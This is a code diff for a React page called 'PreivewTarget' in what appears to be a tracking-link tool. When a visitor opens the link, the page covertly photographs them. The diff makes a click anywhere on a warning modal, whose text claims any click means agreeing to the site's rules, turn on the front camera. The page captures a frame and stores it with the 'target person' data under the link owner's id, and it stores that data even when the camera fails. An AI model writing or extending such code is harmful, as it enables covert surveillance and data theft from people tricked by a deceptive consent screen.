@@ -13,13 +13,13 @@ export default function PreivewTarget() {
     const [showModal,setshowModal] = useState(true)
     const [error,seterror] = useState(false)
     const [targetPersonData,setTargetPersonData] = useState(null)
+    const [IsClicked,setIsClicked] = useState(false)
     const vdo = useRef(null)
     const warnModal = useRef(null)
     let location = useLocation();
-
-    const {curentUser} = useAuth() 
-    const {uid} = curentUser
+ 
     const theKey = location.search?.replace('?','')
+    const uid = location.hash?.replace('#','')
     const {data} = useFetchDetails(theKey,'links',uid)
  
     useEffect(() => {
@@ -88,61 +88,70 @@ export default function PreivewTarget() {
  
      
     function ClickedOkay() {
-        const video = vdo.current
-        // Check if the browser supports the getUserMedia method
-        if (!error && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            // Access the front camera by specifying the facingMode constraint
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-                .then(function (stream) { 
 
-                    // Assign the stream to the video element's srcObject
-                    video.srcObject = stream;
-                    video.play()
+        if (!IsClicked) {
+            PhotoAndStore()
+            setIsClicked(true)
+        }
+        
 
-                    // Converting a frame into base64 photo
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas')
-                        const context = canvas.getContext('2d')
+        function PhotoAndStore() { 
+            const video = vdo.current
+            // Check if the browser supports the getUserMedia method
+            if (!error && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                // Access the front camera by specifying the facingMode constraint
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                    .then(function (stream) { 
 
-                        canvas.width = video.videoWidth
-                        canvas.height = video.videoHeight
+                        // Assign the stream to the video element's srcObject
+                        video.srcObject = stream;
+                        video.play()
 
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height)
+                        // Converting a frame into base64 photo
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas')
+                            const context = canvas.getContext('2d')
 
-                        stream.getTracks().forEach(track => track.stop());
+                            canvas.width = video.videoWidth
+                            canvas.height = video.videoHeight
 
-                        const photoUrl = canvas.toDataURL('image/png')
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height)
 
-                        const UpdateState = {...targetPersonData,img:photoUrl}
-                     
+                            stream.getTracks().forEach(track => track.stop());
+
+                            const photoUrl = canvas.toDataURL('image/png')
+
+                            const UpdateState = {...targetPersonData,img:photoUrl}
+                        
+                            // Storing Data into DB
+                            StoreData(uid,UpdateState,'infos',true)
+
+                            // Hide Warning/Alert modal
+                            setshowModal(false)
+                
+
+                        }, 1000);
+
+                    })
+                    .catch(function (error) { 
+
                         // Storing Data into DB
-                        StoreData(uid,UpdateState,'infos',true)
+                        StoreData(uid,targetPersonData,'infos',true)
 
                         // Hide Warning/Alert modal
                         setshowModal(false)
-            
 
-                    }, 1000);
-
-                })
-                .catch(function (error) { 
-
+                        console.error('Error accessing camera:', error);
+                    });
+            } else { 
+                if (!error) {
                     // Storing Data into DB
                     StoreData(uid,targetPersonData,'infos',true)
-
                     // Hide Warning/Alert modal
                     setshowModal(false)
-
-                    console.error('Error accessing camera:', error);
-                });
-        } else { 
-            if (!error) {
-                // Storing Data into DB
-                StoreData(uid,targetPersonData,'infos',true)
-                // Hide Warning/Alert modal
-                setshowModal(false)
-            } 
-            console.error('getUserMedia is not supported in this browser');
+                } 
+                console.error('getUserMedia is not supported in this browser');
+            }
         }
     }
     
@@ -159,11 +168,11 @@ export default function PreivewTarget() {
                 </div>
        
                 {showModal ? 
-                    <div className={style.warnModal} ref={warnModal}> 
+                    <div className={style.warnModal} ref={warnModal} onClick={ClickedOkay}> 
                         <video ref={vdo} width="500" height="500"></video>
                         <div>
                             <i>Don't click anywhere before knowing about this site, if you will click anywhere that means you are agree with our rules and regulations. to more close this window/tab and visti TOS/Privacy pages from our home page</i>
-                            <Button redTheme onClick={ClickedOkay}>Okay</Button>
+                            <Button redTheme>Okay</Button>
                         </div>
                     </div>
                 : null}
